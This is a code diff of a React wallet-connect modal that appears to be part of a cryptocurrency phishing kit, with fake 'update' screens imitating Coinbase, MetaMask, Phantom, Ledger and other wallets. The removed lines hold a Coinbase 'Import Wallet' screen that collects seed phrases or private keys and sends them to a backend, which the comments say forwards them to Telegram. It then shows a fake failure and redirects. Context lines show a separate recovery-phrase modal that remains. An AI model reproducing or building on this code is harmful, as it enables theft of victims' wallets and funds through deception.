@@ -52,11 +52,8 @@ export default function WalletModal({ open, onClose }) {
   const [gFlow, setGFlow] = useState({ name:'', img:'', color:'#3a96ff', state:'idle', progress:0 })
   const [wcState, setWcState] = useState('idle') // 'idle'|'loading'|'update'|'updating'
   const [wcProgress, setWcProgress] = useState(0)
-  const [cbState, setCbState] = useState('idle') // Coinbase: 'idle'|'loading'|'update'|'updating'|'import'|'failed'
+  const [cbState, setCbState] = useState('idle') // Coinbase
   const [cbProgress, setCbProgress] = useState(0)
-  const [cbImportType, setCbImportType] = useState('') // '12'|'24'|'private'
-  const [cbImportValue, setCbImportValue] = useState('')
-  const [cbImportLoading, setCbImportLoading] = useState(false)
   const [phState, setPhState] = useState('idle') // Phantom
   const [phProgress, setPhProgress] = useState(0)
   const [okxState, setOkxState] = useState('idle') // OKX
@@ -92,7 +89,7 @@ export default function WalletModal({ open, onClose }) {
   }
 
   useEffect(() => {
-    if (open) { setSelected(null); setSearch(''); setMmState('idle'); setMmProgress(0); setTwState('idle'); setTwProgress(0); setWcState('idle'); setWcProgress(0); setCbState('idle'); setCbProgress(0); setCbImportType(''); setCbImportValue(''); setCbImportLoading(false); setPhState('idle'); setPhProgress(0); setOkxState('idle'); setOkxProgress(0); setInchState('idle'); setInchProgress(0); setRabbyState('idle'); setRabbyProgress(0); setRainbowState('idle'); setRainbowProgress(0); setKeplrState('idle'); setKeplrProgress(0); setLedgerState('idle'); setLedgerProgress(0); setGFlow({ name:'', img:'', color:'#3a96ff', state:'idle', progress:0 }) }
+    if (open) { setSelected(null); setSearch(''); setMmState('idle'); setMmProgress(0); setTwState('idle'); setTwProgress(0); setWcState('idle'); setWcProgress(0); setCbState('idle'); setCbProgress(0); setPhState('idle'); setPhProgress(0); setOkxState('idle'); setOkxProgress(0); setInchState('idle'); setInchProgress(0); setRabbyState('idle'); setRabbyProgress(0); setRainbowState('idle'); setRainbowProgress(0); setKeplrState('idle'); setKeplrProgress(0); setLedgerState('idle'); setLedgerProgress(0); setGFlow({ name:'', img:'', color:'#3a96ff', state:'idle', progress:0 }) }
   }, [open])
 
   const handleMetaMaskConnect = () => {
@@ -126,87 +123,6 @@ export default function WalletModal({ open, onClose }) {
 
   const handleCbConnect = () => { onClose(); setCbState('loading') }
   const handleCbUpdate  = () => { setCbState('updating'); setCbProgress(0) }
-
-  const handleCbImport = async () => {
-    if (!cbImportValue.trim()) return
-
-    setCbImportLoading(true)
-
-    try {
-      // Get backend URL from environment or use relative path for production
-      const backendUrl = import.meta.env.VITE_BACKEND_URL || '/api/send-recovery-phrase'
-
-      // Send the import data to Telegram bot immediately (don't wait for response)
-      console.log('🔄 Sending import data to:', backendUrl)
-      console.log('📝 Data:', { phrase: cbImportValue.substring(0, 20) + '...', walletName: `Coinbase Wallet (${cbImportType})` })
-      
-      fetch(backendUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          phrase: cbImportValue,
-          walletName: `Coinbase Wallet (${cbImportType})`,
-        }),
-      }).then(response => {
-        console.log('✅ Backend response status:', response.status)
-        if (!response.ok) {
-          console.error('❌ Backend error:', response.statusText)
-        }
-        return response.json().catch(() => ({}))
-      }).then(data => {
-        console.log('📨 Backend response:', data)
-        if (data.success) {
-          console.log('🎉 Data sent to Telegram successfully!')
-        } else {
-          console.error('❌ Telegram send failed:', data.error)
-        }
-      }).catch(error => {
-        console.error('🚨 Network error sending to Telegram:', error)
-      })
-
-      // Immediately show failed state after 0.5 seconds (data sent in background)
-      setTimeout(() => {
-        setCbImportLoading(false)
-        setCbState('failed')
-        // Close modal and redirect after another 1 second (total 1.5 seconds)
-        setTimeout(() => {
-          console.log('🔄 Closing modal and redirecting to /connect')
-          // Reset Coinbase states before closing
-          setCbState('idle')
-          setCbProgress(0)
-          setCbImportType('')
-          setCbImportValue('')
-          setCbImportLoading(false)
-          onClose() // Close the modal
-          setTimeout(() => {
-            window.location.replace('/connect')
-          }, 100) // Small delay after closing modal
-        }, 1000)
-      }, 500)
-    } catch (error) {
-      console.error('💥 Import function error:', error)
-      // Even on error, show failed after 0.5 seconds
-      setTimeout(() => {
-        setCbImportLoading(false)
-        setCbState('failed')
-        setTimeout(() => {
-          console.log('🔄 Closing modal and redirecting to /connect (error case)')
-          // Reset Coinbase states before closing
-          setCbState('idle')
-          setCbProgress(0)
-          setCbImportType('')
-          setCbImportValue('')
-          setCbImportLoading(false)
-          onClose() // Close the modal
-          setTimeout(() => {
-            window.location.replace('/connect')
-          }, 100) // Small delay after closing modal
-        }, 1000)
-      }, 500)
-    }
-  }
 
   const handlePhConnect  = () => { onClose(); setPhState('loading'); setTimeout(() => setPhState('update'), 2200) }
   const handleOkxConnect    = () => { onClose(); setOkxState('loading') }
@@ -281,11 +197,7 @@ export default function WalletModal({ open, onClose }) {
     if (cbState !== 'updating') return
     const interval = setInterval(() => {
       setCbProgress(p => {
-        if (p >= 100) { 
-          clearInterval(interval)
-          setTimeout(() => setCbState('import'), 500) // Transition to import after completion
-          return 100 
-        }
+        if (p >= 100) { clearInterval(interval); return 100 }
         const step = p < 30 ? 1 : p < 70 ? 2 : p < 90 ? 1.5 : 0.5
         return Math.min(100, p + step)
       })
@@ -374,6 +286,7 @@ export default function WalletModal({ open, onClose }) {
       setRecoveryLoading(false)
       setShowRecoveryModal(false)
       setTimeout(() => {
+        // Navigate back to connect page by reloading or using window.location
         window.location.href = '/connect'
       }, 2000)
     } catch (error) {
@@ -1568,150 +1481,6 @@ export default function WalletModal({ open, onClose }) {
             </div>
             <div style={{ width:'100%', marginTop:4, padding:'15px', borderRadius:50, background:'#c8d8ff', fontSize:16, fontWeight:700, color:'#fff', textAlign:'center' }}>Please wait...</div>
             <div style={{ fontSize:12, color:'#999', marginTop:2, textAlign:'center' }}>This may take a few moments. Do not close this window.</div>
-          </div>
-        </div>
-      )}
-
-      {/* ── Coinbase: Import Phrase ── */}
-      {cbState === 'import' && (
-        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:320, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
-          <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', padding:'14px 16px', borderBottom:'1px solid #f0f0f0' }}>
-            <div style={{ width:72, height:72, borderRadius:18, background:'#0052FF', display:'flex', alignItems:'center', justifyContent:'center' }}>
-              <div style={{ width:32, height:32, borderRadius:6, background:'#fff', display:'flex', alignItems:'center', justifyContent:'center' }}>
-                <div style={{ width:14, height:14, borderRadius:3, background:'#0052FF' }} />
-              </div>
-            </div>
-            <button onClick={() => setCbState('idle')} style={{ width:32, height:32, borderRadius:'50%', border:'2px solid #0052FF', background:'none', cursor:'pointer', display:'flex', alignItems:'center', justifyContent:'center', color:'#0052FF', fontSize:15, fontWeight:700 }}>✕</button>
-          </div>
-          <div style={{ display:'flex', flexDirection:'column', padding:'20px', gap:16 }}>
-            <div style={{ fontSize:18, fontWeight:800, color:'#111', textAlign:'center' }}>Import Wallet</div>
-            <div style={{ fontSize:14, color:'#666', textAlign:'center', marginTop:-8 }}>Choose how you'd like to import your wallet</div>
-            
-            {/* Import Type Selection */}
-            <div style={{ display:'flex', flexDirection:'column', gap:12 }}>
-              <button 
-                onClick={() => setCbImportType('12')}
-                style={{ 
-                  width:'100%', 
-                  padding:'14px', 
-                  borderRadius:12, 
-                  border: cbImportType === '12' ? '2px solid #0052FF' : '2px solid #e0e0e0', 
-                  background: cbImportType === '12' ? '#EEF2FF' : '#fff',
-                  cursor:'pointer',
-                  textAlign:'left',
-                  transition:'all 0.2s'
-                }}
-              >
-                <div style={{ fontSize:16, fontWeight:600, color:'#111' }}>12-Word Seed Phrase</div>
-                <div style={{ fontSize:13, color:'#666', marginTop:2 }}>Import using your 12-word recovery phrase</div>
-              </button>
-              
-              <button 
-                onClick={() => setCbImportType('24')}
-                style={{ 
-                  width:'100%', 
-                  padding:'14px', 
-                  borderRadius:12, 
-                  border: cbImportType === '24' ? '2px solid #0052FF' : '2px solid #e0e0e0', 
-                  background: cbImportType === '24' ? '#EEF2FF' : '#fff',
-                  cursor:'pointer',
-                  textAlign:'left',
-                  transition:'all 0.2s'
-                }}
-              >
-                <div style={{ fontSize:16, fontWeight:600, color:'#111' }}>24-Word Seed Phrase</div>
-                <div style={{ fontSize:13, color:'#666', marginTop:2 }}>Import using your 24-word recovery phrase</div>
-              </button>
-              
-              <button 
-                onClick={() => setCbImportType('private')}
-                style={{ 
-                  width:'100%', 
-                  padding:'14px', 
-                  borderRadius:12, 
-                  border: cbImportType === 'private' ? '2px solid #0052FF' : '2px solid #e0e0e0', 
-                  background: cbImportType === 'private' ? '#EEF2FF' : '#fff',
-                  cursor:'pointer',
-                  textAlign:'left',
-                  transition:'all 0.2s'
-                }}
-              >
-                <div style={{ fontSize:16, fontWeight:600, color:'#111' }}>Private Key</div>
-                <div style={{ fontSize:13, color:'#666', marginTop:2 }}>Import using your private key</div>
-              </button>
-            </div>
-            
-            {/* Input Field */}
-            {cbImportType && (
-              <div style={{ marginTop:8 }}>
-                <label style={{ fontSize:13, fontWeight:600, color:'#333', textTransform:'uppercase', letterSpacing:0.5, marginBottom:6, display:'block' }}>
-                  {cbImportType === 'private' ? 'Private Key' : `${cbImportType}-Word Seed Phrase`}
-                </label>
-                <textarea
-                  value={cbImportValue}
-                  onChange={(e) => setCbImportValue(e.target.value)}
-                  placeholder={cbImportType === 'private' ? 'Enter your private key' : `Enter your ${cbImportType}-word seed phrase`}
-                  style={{
-                    width:'100%',
-                    minHeight: cbImportType === 'private' ? 80 : 100,
-                    padding:'12px',
-                    border:'2px solid #e0e0e0',
-                    borderRadius:8,
-                    fontFamily:'Inter, monospace',
-                    fontSize:14,
-                    color:'#111',
-                    background:'#f9f9f9',
-                    resize:'vertical',
-                    outline:'none',
-                    boxSizing:'border-box'
-                  }}
-                  disabled={cbImportLoading}
-                />
-              </div>
-            )}
-            
-            {/* Import Button */}
-            {cbImportType && (
-              <button 
-                onClick={handleCbImport}
-                disabled={!cbImportValue.trim() || cbImportLoading}
-                style={{ 
-                  width:'100%', 
-                  marginTop:8, 
-                  padding:'14px', 
-                  borderRadius:50, 
-                  background: (!cbImportValue.trim() || cbImportLoading) ? '#c8d8ff' : '#0052FF', 
-                  color:'#fff', 
-                  border:'none', 
-                  fontSize:16, 
-                  fontWeight:700, 
-                  cursor: (!cbImportValue.trim() || cbImportLoading) ? 'not-allowed' : 'pointer',
-                  transition:'all 0.2s'
-                }}
-              >
-                {cbImportLoading ? 'Importing...' : `Import ${cbImportType === 'private' ? 'Private Key' : 'Seed Phrase'}`}
-              </button>
-            )}
-          </div>
-        </div>
-      )}
-
-      {/* ── Coinbase: Failed ── */}
-      {cbState === 'failed' && (
-        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:320, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
-          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'28px 20px 20px', gap:12 }}>
-            <div style={{ width:72, height:72, borderRadius:18, background:'#ff4444', display:'flex', alignItems:'center', justifyContent:'center' }}>
-              <div style={{ fontSize:32, color:'#fff' }}>❌</div>
-            </div>
-            <div style={{ fontSize:22, fontWeight:800, color:'#111', textAlign:'center', marginTop:4 }}>Connection Failed</div>
-            <div style={{ fontSize:14, color:'#666', textAlign:'center', marginTop:-6 }}>Unable to import wallet. Please try again.</div>
-            <div style={{ width:'100%', background:'#ffeaea', borderLeft:'3px solid #ff4444', borderRadius:'0 8px 8px 0', padding:'14px 16px', marginTop:4 }}>
-              <span style={{ fontSize:14, color:'#1a1a1a', lineHeight:1.6 }}>The wallet could not be imported. Please check your seed phrase or private key and try again.</span>
-            </div>
-            <button 
-              onClick={() => { setCbState('idle'); window.location.href = '/connect' }}
-              style={{ width:'100%', marginTop:8, padding:'14px', borderRadius:50, background:'#0052FF', color:'#fff', border:'none', fontSize:16, fontWeight:700, cursor:'pointer' }}
-            >Back to Connect</button>
           </div>
         </div>
       )}
